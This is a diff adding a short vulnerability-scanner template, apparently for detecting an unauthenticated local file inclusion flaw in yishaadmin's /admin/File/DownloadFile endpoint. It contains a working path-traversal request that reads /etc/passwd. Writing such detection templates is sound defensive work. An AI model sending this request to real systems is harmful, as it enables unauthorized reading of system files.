@@ -1,0 +1,20 @@
+id: yishaadmin-lfi
+brief:
+    title: yishaadmin - Local File Inclusion
+    by: Evan Rubinstein
+    level: high
+    about: yishaadmin is vulnerable to local file inclusion via the "/admin/File/DownloadFile" endpoint and allows files to be downloaded, read or deleted without any authentication.
+    label:
+        - lfi
+        - yishaadmin
+        - huntr
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/admin/File/DownloadFile?filePath=wwwroot/..././/..././/..././/..././/..././/..././/..././/..././etc/passwd&delete=0'
+      signs:
+        - "on": status
+          status:
+            - 200
